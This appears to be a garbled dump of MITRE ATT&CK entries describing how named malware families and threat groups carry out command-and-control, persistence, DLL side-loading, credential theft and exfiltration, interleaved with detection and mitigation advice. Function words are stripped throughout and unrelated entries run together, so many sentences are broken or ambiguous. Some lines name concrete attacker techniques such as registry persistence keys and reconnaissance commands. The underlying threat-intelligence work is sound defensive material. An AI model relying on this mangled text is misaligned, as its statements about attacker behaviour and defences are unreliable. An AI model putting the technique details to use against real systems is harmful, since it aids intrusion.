[HotCroissant](https://attack.mitre.org/software/S0431) ability download files infected host command control (C2) server.(Citation: Carbon Black HotCroissant April 2020) [APT28](https://attack.mitre.org/groups/G0007)'s operation involved [CHOPSTICK](https://attack.mitre.org/software/S0023) modules air-gapped machines, files written USB sticks transfer data command traffic.(Citation: FireEye APT28)(Citation: ESET Sednit 2)(Citation: SIR 19) [CORESHELL](https://attack.mitre.org/software/S0137) communicate C2.(Citation: FireEye APT28)(Citation: SIR 19) [Aria-body](https://attack.mitre.org/software/S0456) ability launch files <code>ShellExecute</code>.(Citation: CheckPoint Naikon 2020) [WinMM](https://attack.mitre.org/software/S0059) sets WH_CBT Windows hook search capture files victim.(Citation: Baumgartner Naikon 2015) [Bazar](https://attack.mitre.org/software/S0534) ability identify domain administrator accounts.(Citation: NCC Team9 June 2020)(Citation: DFIR Ryuk's Return October 2020) [Industroyer](https://attack.mitre.org/software/S0604)’s data wiper module clears registry overwrites ICS configuration Windows files.(Citation: Dragos Crashoverride 2017) [njRAT](https://attack.mitre.org/software/S0385) download files victim’s machine.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors registered hundreds domains Duck DNS DNS Exit.(Citation: ESET Operation Spalax Jan 2021) [Metamorfo](https://attack.mitre.org/software/S0455) C2.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019)  Utilize trust model Docker Content Trust digital signatures ensure runtime verification integrity publisher specific image tags.(Citation: Content trust Docker)(Citation: Content trust Azure Container Registry) [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools [LaZagne](https://attack.mitre.org/software/S0349) gather credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) Monitor newly constructed windows registry scripts automatically executed boot logon initialization establish persistence. [Duqu](https://attack.mitre.org/software/S0038) <code>msiexec</code> execute malicious Windows Installer packages. Additionally, PROPERTY=VALUE pair 56-bit encryption key decrypt main payload installer packages.(Citation: Kaspersky Duqu 2.0) [Emotet](https://attack.mitre.org/software/S0367) observed encrypted, modified protobuf-based protocol command control messaging.(Citation: Sophos Emotet Apr 2019)(Citation: DanielManea Emotet 2017) [RainyDay](https://attack.mitre.org/software/S0629) ability uninstall deleting service files.(Citation: Bitdefender Naikon April 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) macros scan Word Excel files inject additional malicious macros. [Gamaredon Group](https://attack.mitre.org/groups/G0047) backdoors automatically list files (such Office documents) system.(Citation: ESET Gamaredon June 2020)(Citation: Unit 42 Gamaredon February 2022)	 Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [ShimRatReporter](https://attack.mitre.org/software/S0445) Windows function <code>GetExtendedUdpTable</code> detect connected UDP endpoints.(Citation: FOX-IT 2016 Mofang) containerized environments, image IDs layer hashes compare images relying names.(Citation: Docker Images) Monitor unexpected creation resources cluster Kubernetes, created atypical users. [AADInternals](https://attack.mitre.org/software/S0677) enumerate variety cloud services, Office 365 Sharepoint instances OpenID Configurations.(Citation: AADInternals Documentation) [FIN6](https://attack.mitre.org/groups/G0037) Metasploit’s [PsExec](https://attack.mitre.org/software/S0029) NTDSGRAB module victim's Active Directory database.(Citation: FireEye FIN6 April 2016) initial execution, [BACKSPACE](https://attack.mitre.org/software/S0031) extracts operating infected host.(Citation: FireEye APT30) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors downloaded malware tools compromised host.(Citation: BlackBerry CostaRicto November 2020) [TinyTurla](https://attack.mitre.org/software/S0668) ability encrypt C2 traffic SSL/TLS.(Citation: Talos TinyTurla September 2021) [Bazar](https://attack.mitre.org/software/S0534) enumerate remote systems <code> View</code>.(Citation: Cybereason Bazar July 2020) [Inception](https://attack.mitre.org/groups/G0100) incorporated cloud service providers C2 infrastructure including CloudMe.(Citation: Kaspersky Cloud Atlas December 2014)(Citation: Symantec Inception Framework March 2018) [Carbanak](https://attack.mitre.org/software/S0030) performs desktop video recording captures screenshots desktop sends C2 server.(Citation: FireEye CARBANAK June 2017) [Dragonfly](https://attack.mitre.org/groups/G0035) collected source identify relationships organizations targeting purposes.(Citation: Gigamon Berserk Bear October 2021) [Pandora](https://attack.mitre.org/software/S0664) DLL side-loading execute malicious payloads.(Citation: Trend Micro Iron Tiger April 2021) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor executed commands arguments exfiltrate data, sensitive documents, automated processing gathered Collection [RTM](https://attack.mitre.org/groups/G0048) search hijacking force TeamViewer load malicious DLL.(Citation: IB RTM August 2019) [Empire](https://attack.mitre.org/software/S0363) ability obfuscate commands <code>Invoke-Obfuscation</code>.(Citation: Github PowerShell Empire) [ZxxZ](https://attack.mitre.org/software/S1013) collected host operating product compromised machine.(Citation: Cisco Talos Bitter Bangladesh 2022)  variant [Zebrocy](https://attack.mitre.org/software/S0251) WMI queries gather information.(Citation: Unit42 Sofacy Dec 2018) Monitor executed commands arguments abuse features Winlogon execute DLLs executables user logs in. [PoshC2](https://attack.mitre.org/software/S0378) protocols HTTP/HTTPS command control traffic.(Citation: GitHub PoshC2) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [APT28](https://attack.mitre.org/groups/G0007) downloads executes PowerShell scripts performs PowerShell commands.(Citation: Palo Alto Sofacy 06-2018)(Citation: TrendMicro Pawn Storm Dec 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Tonto Team](https://attack.mitre.org/groups/G0131) abuses legitimate signed executable launch malicious DLL.(Citation: ESET Exchange Mar 2021) [APT28](https://attack.mitre.org/groups/G0007) exfiltrated archives collected data staged target's OWA server HTTPS.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [APT39](https://attack.mitre.org/groups/G0087) malware <code>RequireSigned</code> feature ensures signed DLLs Windows.(Citation: FBI FLASH APT39 September 2020) (Citation: Symantec Buckeye) Applying restrictive permissions files directories prevent adversaries modifying access control lists. Registry specific Office feature control security set disable automatic DDE/OLE execution. (Citation: DDE Advisory Nov 2017)(Citation: BleepingComputer DDE Disabled Word Dec 2017)(Citation: GitHub Disable DDEAUTO Oct 2017) created, enabled default, Registry completely disable DDE execution Word Excel.(Citation: ADV170021 Dec 2017) [Epic](https://attack.mitre.org/software/S0091) <code>net time</code> command  time machine collect current time zone information.(Citation: Kaspersky Turla) (Citation: Cylance Cleaver) Regularly scan internal network services identify vulnerable services. [CORESHELL](https://attack.mitre.org/software/S0137) communicate SMTP POP3 C2.(Citation: FireEye APT28)(Citation: SIR 19) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Transparent Tribe](https://attack.mitre.org/groups/G0134) dropped encoded executables compromised hosts.(Citation: Proofpoint Operation Transparent Tribe March 2016) [HOPLIGHT](https://attack.mitre.org/software/S0376) multiple C2 channels fails.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Lazarus Group](https://attack.mitre.org/groups/G0032) malware IndiaIndia obtains sends C2 server title window running process. KilaAlfa keylogger reports title window foreground.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster Tools) [BLINDINGCAN](https://attack.mitre.org/software/S0520) executed commands cmd.exe.(Citation: US-CERT BLINDINGCAN Aug 2020) versions [Cherry Picker](https://attack.mitre.org/software/S0107) delete files registry created malware.(Citation: Trustwave Cherry Picker) [Seth-Locker](https://attack.mitre.org/software/S0639) ability download execute files compromised host.(Citation: Trend Micro Ransomware February 2021) [Seasalt](https://attack.mitre.org/software/S0345) cmd.exe create reverse infected endpoint.(Citation: Mandiant APT1 Appendix) [SideCopy](https://attack.mitre.org/groups/G1008) compromised domains infrastructure, including C2 staging malware.(Citation: MalwareBytes SideCopy Dec 2021) Limit communications container service local Unix sockets remote access SSH. Require secure port access communicate APIs TLS disabling unauthenticated access Docker API port 2375. Instead, communicate Docker API TLS port 2376.(Citation: Docker Daemon Socket Protect) Monitor API calls attempt gather domain accounts type user, privileges groups. [menuPass](https://attack.mitre.org/groups/G0045) compressed files exfiltration TAR RAR.(Citation: PWC Cloud Hopper April 2017)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Symantec Cicada November 2020) Monitor newly constructed processes, e.g. browsers, gather personal users (ex: banking sites, interests, social media, etc.) [YAHOYAH](https://attack.mitre.org/software/S0388) requests download files executed memory.(Citation: TrendMicro TropicTrooper 2015) [Bankshot](https://attack.mitre.org/software/S0239) marks files deleted reboot uninstalls removes system.(Citation: McAfee Bankshot) [KONNI](https://attack.mitre.org/software/S0356) gather OS version, architecture information, connected drives, hostname, RAM size, disk space victim’s machine <code>cmd /c systeminfo</code> command snapshot current target machine.(Citation: Talos Konni 2017)(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021) [GoldenSpy](https://attack.mitre.org/software/S0493) create users infected system.(Citation: Trustwave GoldenSpy June 2020)	 [CharmPower](https://attack.mitre.org/software/S0674) list installed applications compromised host.(Citation: Check APT35 CharmPower January 2022) [TEMP.Veles](https://attack.mitre.org/groups/G0088) modified entries <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code> maintain persistence.(Citation: FireEye TRITON 2019)	
 [Patchwork](https://attack.mitre.org/groups/G0040) .dll [BADNEWS](https://attack.mitre.org/software/S0128) loaded executed DLL side-loading.(Citation: TrendMicro Patchwork Dec 2017) [PowerShower](https://attack.mitre.org/software/S0441) collected infected host.(Citation: Unit 42 Inception November 2018) [TrickBot](https://attack.mitre.org/software/S0266) setup scheduled task persistence.(Citation: ESET Trickbot Oct 2020) [Peirates](https://attack.mitre.org/software/S0683) `kubectl` Kubernetes API commands.(Citation: Peirates GitHub) [Lazarus Group](https://attack.mitre.org/groups/G0032) developed custom malware operations.(Citation: CISA AppleJeus Feb 2021)(Citation: ESET Lazarus Jun 2020)(Citation: Google TAG Lazarus Jan 2021)(Citation: ClearSky Lazarus Aug 2020) Monitor newly executed processes establish persistence executing malicious commands triggered user’s shell. [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors [at](https://attack.mitre.org/software/S0110) schedule tasks self-extracting RAR archives, install [HTTPBrowser](https://attack.mitre.org/software/S0070) [PlugX](https://attack.mitre.org/software/S0013) victims network.(Citation: Dell TG-3390) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools [LaZagne](https://attack.mitre.org/software/S0349) gather credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) [CosmicDuke](https://attack.mitre.org/software/S0050) Windows services typically named "javamtsup" persistence.(Citation: F-Secure Cosmicduke) [Gelsemium](https://attack.mitre.org/software/S0666) bypass UAC elevate process privileges compromised host.(Citation: ESET Gelsemium June 2021) [HTTPBrowser](https://attack.mitre.org/software/S0070) abuses Windows DLL load legitimate Symantec anti-virus binary, VPDN_LU.exe, load malicious DLL mimics legitimate Symantec DLL, navlu.dll.(Citation: ZScaler Hacking Team) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level.  (Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Patchwork](https://attack.mitre.org/groups/G0040) payload deletes Resiliency Registry created Office applications apparent effort trick users thinking issues application runs.(Citation: TrendMicro Patchwork Dec 2017) [BlackTech](https://attack.mitre.org/groups/G0098) tools Putty, SNScan, [PsExec](https://attack.mitre.org/software/S0029) operations.(Citation: Symantec Palmerworm Sep 2020) [FIN8](https://attack.mitre.org/groups/G0061) FTP exfiltrate collected data.(Citation: FireEye Enemy FIN8 Aug 2016) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Explosive](https://attack.mitre.org/software/S0569) function write Registry values.(Citation: CheckPoint Volatile Cedar March 2015)  [ComRAT](https://attack.mitre.org/software/S0126) requests command control.(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020) [NavRAT](https://attack.mitre.org/software/S0247) writes multiple outputs TMP file >> method.(Citation: Talos NavRAT 2018) [WIRTE](https://attack.mitre.org/groups/G0090) attempted lure users malicious Word Excel files execute malicious payloads.(Citation: Kaspersky WIRTE November 2021) [Ryuk](https://attack.mitre.org/software/S0446) multiple native APIs including <code>ShellExecuteW</code> executables,<code>GetWindowsDirectoryW</code> create folders, <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> process injection.(Citation: CrowdStrike Ryuk January 2019) [Amadey](https://attack.mitre.org/software/S1025) obfuscated strings antivirus vendor names, domains, files, others.(Citation: BlackBerry Amadey 2020) Similarly, AMSI / ETW traces identify signs arbitrary code execution memory compromised processes.(Citation: MDSec Detecting DOTNET)(Citation: Introducing Donut) [TajMahal](https://attack.mitre.org/software/S0467) ability identify hardware information, name, OS infected host.(Citation: Kaspersky TajMahal April 2019) Monitor third-party application logging, messaging, artifacts abuse legitimate extensible development features servers establish persistent access systems. monitoring application logs abnormal behavior suspicious installation application software components. Log authentication attempts server unusual traffic patterns server internal network. (Citation: US-CERT Alert TA15-314A Shells) [Turian](https://attack.mitre.org/software/S0647) search specific files list directories.(Citation: ESET BackdoorDiplomacy Jun 2021) [Grandoreiro](https://attack.mitre.org/software/S0531) write modify browser shortcuts enable launching malicious browser extensions.(Citation: IBM Grandoreiro April 2020)  [Kevin](https://attack.mitre.org/software/S1020) hide current window targeted user `ShowWindow` API function.(Citation: Kaspersky Lyceum October 2021) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit 42 Playbook Dec 2017) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool spawn svchost.exe inject payload process.(Citation: Nccgroup Emissary Panda 2018)(Citation: Securelist LuckyMouse June 2018) Monitor executed commands arguments logon scripts technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Magic Hound](https://attack.mitre.org/groups/G0059) command-line interface.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: DFIR Report APT35 ProxyShell March 2022) [S-Type](https://attack.mitre.org/software/S0085) tests determine privilege level compromised user.(Citation: Cylance Dust Storm) [Cobian RAT](https://attack.mitre.org/software/S0338) feature access webcam victim’s machine.(Citation: Zscaler Cobian Aug 2017) [Aria-body](https://attack.mitre.org/software/S0456) ability DGA C2 communications.(Citation: CheckPoint Naikon 2020) MuddyWater legitimate tools ConnectWise Remote Utilities gain access target environment.(Citation: Anomali Static Kitten February 2021) [POORAIM](https://attack.mitre.org/software/S0216) conduct file browsing.(Citation: FireEye APT37 Feb 2018) [MarkiRAT](https://attack.mitre.org/software/S0652) retrieve victim’s username.(Citation: Kaspersky Ferocious Kitten Jun 2021) Monitor executed commands arguments attempt access create Active Directory domain database steal credential information, domain devices, users, access rights. command-lines invoke attempts access NTDS.dit. Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system. [Tropic Trooper](https://attack.mitre.org/groups/G0081) capable enumerating running processes <code>pslist</code>.(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper 2020) [TrickBot](https://attack.mitre.org/software/S0266) creates scheduled task persistence.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Totbrick Oct 2016)(Citation: Totbrick Oct 2017) [Olympic Destroyer](https://attack.mitre.org/software/S0365) module stored credentials browsers.(Citation: Talos Olympic Destroyer 2018) [Clambling](https://attack.mitre.org/software/S0660) Dropbox download malicious payloads, send commands, receive information.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [PoetRAT](https://attack.mitre.org/software/S0428) called cmd Word document macro.(Citation: Talos PoetRAT October 2020) Monitor created processes arguments delete alter malicious network configuration settings generated artifacts highlight network connection history host -- include logs, files, Registry values. Data loss prevention detect block sensitive data copied physical mediums. [Octopus](https://attack.mitre.org/software/S0340) exfiltrate files documents collector tool.(Citation: ESET Nomadic Octopus 2018) [Bazar](https://attack.mitre.org/software/S0534) gain execution user clicks malicious link decoy landing hosted Google Docs.(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020)(Citation: CrowdStrike Wizard Spider October 2020) [Dyre](https://attack.mitre.org/software/S0024) detect sandbox analysis environments inspecting process list Registry.(Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015) (Citation: ESET EvilNum July 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Shark](https://attack.mitre.org/software/S1019) pause C2 communications time.(Citation: ClearSky Siamesekitten August 2021) Registry specific Office feature control security set disable automatic DDE/OLE execution. (Citation: DDE Advisory Nov 2017) (Citation: BleepingComputer DDE Disabled Word Dec 2017) (Citation: GitHub Disable DDEAUTO Oct 2017) created, enabled default, Registry completely disable DDE execution Word Excel. (Citation: ADV170021 Dec 2017) [Bisonal](https://attack.mitre.org/software/S0268) variants reported 2014 2015 simple XOR cipher C2. [Bisonal](https://attack.mitre.org/software/S0268) samples encrypt C2 communications RC4.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020)  Ensure <code>AllowReversiblePasswordEncryption</code> property set disabled application requirements.(Citation: store_pwd_rev_enc) Monitor executed commands arguments updates domain authentication Managed Federated ActionTypes <code>Set federation settings domain</code> <code>Set domain authentication</code>.(Citation: - Azure Sentinel ADFSDomainTrustMods) Monitor PowerShell commands as: <code>Update-MSOLFederatedDomain –DomainName: "Federated Domain Name"</code>, <code>Update-MSOLFederatedDomain –DomainName: "Federated Domain Name" –supportmultipledomain</code>.(Citation: - Update Repair Federated domain) [China Chopper](https://attack.mitre.org/software/S0020)'s client component packed UPX.(Citation: Lee 2013) (Citation: Secureworks MCMD July 2019) [APT28](https://attack.mitre.org/groups/G0007) deployed malware copied startup directory persistence.(Citation: TrendMicro Pawn Storm Dec 2020) [CrackMapExec](https://attack.mitre.org/software/S0488) enumerate domain user accounts targeted system.(Citation: CME Github September 2018) [FLASHFLOOD](https://attack.mitre.org/software/S0036) searches files (either default customized set file extensions) local system. [FLASHFLOOD](https://attack.mitre.org/software/S0036) scan Documents, Desktop, Temporary Internet Files, TEMP directories. [FLASHFLOOD](https://attack.mitre.org/software/S0036) collects stored Windows Address Book.(Citation: FireEye APT30) [Babuk](https://attack.mitre.org/software/S0638) ChaCha8 ECDH encrypt data.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: Medium Babuk February 2021)(Citation: Trend Micro Ransomware February 2021) application control configured block execution <code>mshta.exe</code> required network prevent potential misuse adversaries. example, Windows Windows Server 2016 above, Windows Defender Application Control (WDAC) policy rules applied block <code>mshta.exe</code> application prevent abuse.(Citation: WDAC) [TSCookie](https://attack.mitre.org/software/S0436) ability execute commands infected host.(Citation: JPCert TSCookie March 2018) [TEARDROP](https://attack.mitre.org/software/S0560) checked <code>HKU\SOFTWARE\Microsoft\CTF</code> existed decoding embedded payload.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Deep Dive Solorigate January 2021)  [Kimsuky](https://attack.mitre.org/groups/G0094) tool called GREASE add Windows admin account continued access RDP.(Citation: Netscout Stolen Pencil Dec 2018) [Metamorfo](https://attack.mitre.org/software/S0455) MsiExec.exe automatically execute files.(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019)  [EVILNUM](https://attack.mitre.org/software/S0568) one-way communication method GitLab Digital perform C2.(Citation: Prevailion EvilNum 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034)'s BCS-server tool base64 encoding tags communication traffic C2 server.(Citation: ESET Telebots Dec 2016)	 Monitor creation Office Registry key. Collect events Registry key creation Office-based persistence. v13.52, Autoruns detect tasks set Office Registry key.(Citation: Palo Alto Office Sofacy) [Hi-Zor](https://attack.mitre.org/software/S0087) ability upload download files C2 server.(Citation: Fidelis INOCNATION) [xCaon](https://attack.mitre.org/software/S0653) persistence Registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load</code> malware time user logs in.(Citation: Checkpoint IndigoZebra July 2021) [Carbon](https://attack.mitre.org/software/S0335) creates tasks execution continue persistence victim’s machine.(Citation: ESET Carbon Mar 2017) [DnsSystem](https://attack.mitre.org/software/S1021) exfiltrate collected data C2 server.(Citation: Zscaler Lyceum DnsSystem June 2022) Obfuscate/encrypt event files locally transit avoid feedback adversary. Enable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor analyze error events failed trust validation (Event 81, event subverted hijacked trust provider components) events (ex: successful validations). Code Integrity event logging provide valuable indicators malicious SIP trust provider loads, protected processes attempt load maliciously-crafted trust validation component fail (Event 3033). (Citation: SpectorOps Subverting Trust Sept 2017) [Ursnif](https://attack.mitre.org/software/S0386) [Tor](https://attack.mitre.org/software/S0183) C2.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) 
[StrongPity](https://attack.mitre.org/software/S0491) HTTPS port 1402 C2 communication.(Citation: Bitdefender StrongPity June 2020) Monitor newly constructed user accounts, userIDs 500 macOS, mask presence user accounts create modify. [WarzoneRAT](https://attack.mitre.org/software/S0670) relied victim malicious attachment email execution.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Confucius APT Jan 2021) [APT32](https://attack.mitre.org/groups/G0050) JavaScript drive-by downloads C2 communications.(Citation: Cybereason Cobalt Kitty 2017)(Citation: Volexity Ocean Lotus November 2020) [XCSSET](https://attack.mitre.org/software/S0658) AppleScript check host's language location command <code>user locale (get info)</code>.(Citation: trendmicro xcsset xcode project 2020) [Prikormka](https://attack.mitre.org/software/S0113) keylogger module collects keystrokes titles foreground windows.(Citation: ESET Operation Groundbait) [Empire](https://attack.mitre.org/software/S0363) module creating local user permissions allow.(Citation: Github PowerShell Empire) [Ramsay](https://attack.mitre.org/software/S0458) [ipconfig](https://attack.mitre.org/software/S0100) [Arp](https://attack.mitre.org/software/S0099) collect network configuration information, including routing ARP tables.(Citation: Antiy CERT Ramsay April 2020) [PoisonIvy](https://attack.mitre.org/software/S0012) creates Registry subkey registers service. [PoisonIvy](https://attack.mitre.org/software/S0012) creates Registry entry modifying Logical Disk Manager service malicious DLL dropped disk.(Citation: Symantec Darkmoon Aug 2005) Establish centralized logging instance activity, monitor review events reverting snapshot, rolling changes, changing persistence/type storage. Monitor events deactivation instances occurring planned operations. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [Dragonfly](https://attack.mitre.org/groups/G0035) compromised user credentials valid accounts operations.(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021)(Citation: CISA AA20-296A Berserk Bear December 2020) [Turla](https://attack.mitre.org/groups/G0010) PowerShell profiles maintain persistence infected machine.(Citation: ESET Turla PowerShell 2019) [Whitefly](https://attack.mitre.org/groups/G0107) ability download additional tools C2.(Citation: Symantec Whitefly March 2019) Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. Monitor file delete alter generated artifacts persistence host system. Monitor network traffic anomalies AiTM behavior. [SombRAT](https://attack.mitre.org/software/S0615) <code>getprocesslist</code> command enumerate processes compromised host.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) (Citation: Volexity InkySquid BLUELIGHT August 2021) [Ryuk](https://attack.mitre.org/software/S0446) called <code>CreateToolhelp32Snapshot</code> enumerate running processes.(Citation: CrowdStrike Ryuk January 2019) [Orz](https://attack.mitre.org/software/S0229) versions embedded DLL MockDll [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) regsvr32 execute payload.(Citation: Proofpoint Leviathan Oct 2017) [BabyShark](https://attack.mitre.org/software/S0414) downloaded additional files C2.(Citation: Unit42 BabyShark Apr 2019)(Citation: CISA AA20-301A Kimsuky) monitoring file reads Vault locations, <code>&percnt;Systemdrive&percnt;&bsol;Users&bsol;&bsol;&lsqb;Username&rsqb;&bsol;AppData&bsol;Local&bsol;Microsoft&bsol;&bsol;&lsqb;Vault&sol;Credentials&rsqb;&bsol;</code>, suspicious activity.(Citation: Malwarebytes Windows Vault) [Machete](https://attack.mitre.org/software/S0409)'s collected data exfiltrated channel C2.(Citation: ESET Machete July 2019) [APT32](https://attack.mitre.org/groups/G0050) WMI deploy tools remote machines gather Outlook process.(Citation: Cybereason Cobalt Kitty 2017) Monitor DLL loads processes, DLLs recognized loaded process. abnormal process behavior process loading malicious DLL. [ObliqueRAT](https://attack.mitre.org/software/S0644) capture screenshot current screen.(Citation: Talos Oblique RAT March 2021)
 [GravityRAT](https://attack.mitre.org/software/S0237) collects victim IP address, MAC address, victim account domain name.(Citation: Talos GravityRAT) [PowerDuke](https://attack.mitre.org/software/S0139) steganography hide backdoors PNG files, encrypted Tiny Encryption Algorithm (TEA).(Citation: Volexity PowerDuke November 2016)  [PolyglotDuke](https://attack.mitre.org/software/S0518) write encrypted JSON configuration files Registry.(Citation: ESET Dukes October 2019) [BLINDINGCAN](https://attack.mitre.org/software/S0520) HTTPS port 443 command control.(Citation: US-CERT BLINDINGCAN Aug 2020) [MegaCortex](https://attack.mitre.org/software/S0576) <code>rundll32.exe</code> load DLL file encryption.(Citation: IBM MegaCortex) [Javali](https://attack.mitre.org/software/S0528) capture login credentials browsers including Firefox, Chrome, Internet Explorer, Edge.(Citation: Securelist Brazilian Banking Malware July 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) store configuration strings, keylogger, output components Registry.(Citation: Prevailion DarkWatchman 2021) [ComRAT](https://attack.mitre.org/software/S0126) scheduled task launch PowerShell loader.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020) [PoisonIvy](https://attack.mitre.org/software/S0012) creates Registry subkey registers device.(Citation: Symantec Darkmoon Aug 2005) Variants [WEBC2](https://attack.mitre.org/software/S0109) achieve persistence DLL search hijacking, copying DLL file <code>%SYSTEMROOT%</code> (<code>C:\WINDOWS\ntshrui.dll</code>).(Citation: Mandiant APT1 Appendix) Monitor modification binaries service executables occur regular software update update scheduled organization. Modification files considers actions renaming directory moving. [IceApple](https://attack.mitre.org/software/S1022) Base64 "junk" JavaScript code obfuscate information.(Citation: CrowdStrike IceApple 2022) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363) compromised machine's name.(Citation: Talos Frankenstein June 2019) [Impacket](https://attack.mitre.org/software/S0357) sniff network traffic interface raw socket.(Citation: Impacket Tools) [JHUHUGIT](https://attack.mitre.org/software/S0044) obtains list running processes victim.(Citation: ESET Sednit 1)(Citation: Unit 42 Sofacy Feb 2018) [MuddyWater](https://attack.mitre.org/groups/G0069) mshta.exe execute [POWERSTATS](https://attack.mitre.org/software/S0223) payload pass PowerShell one-liner execution.(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Mosquito](https://attack.mitre.org/software/S0256)'s installer WMI search antivirus display names.(Citation: ESET Turla Mosquito Jan 2018) [PolyglotDuke](https://attack.mitre.org/software/S0518) custom encrypt strings.(Citation: ESET Dukes October 2019) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) spoofed DNS requests create bidirectional tunnel compromised host C2 servers.(Citation: SentinelOne Aoqin Dragon June 2022) [Clambling](https://attack.mitre.org/software/S0660) ability capture screenshots.(Citation: Trend Micro DRBControl February 2020) Monitor modification Registry values services HKLM\SYSTEM\CurrentControlSet\Services adversaries launch code service starts. [Mustang Panda](https://attack.mitre.org/groups/G0129) executed PowerShell scripts WMI.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Apply patch KB2962486 prevents credentials stored GPPs.(Citation: ADSecurity Finding Passwords SYSVOL)(Citation: MS14-025) [APT39](https://attack.mitre.org/groups/G0087) malware set <code>LoadAppInit_DLLs</code> Registry key <code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code> establish persistence.(Citation: FBI FLASH APT39 September 2020) [APT37](https://attack.mitre.org/groups/G0067) downloaded stage malware compromised websites.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft 2019)(Citation: Volexity InkySquid BLUELIGHT August 2021)(Citation: Volexity InkySquid RokRAT August 2021) [BackConfig](https://attack.mitre.org/software/S0475) download execute additional payloads compromised host.(Citation: Unit 42 BackConfig 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) ability extract credentials configuration support files.(Citation: SentinelLabs Agent Tesla Aug 2020)  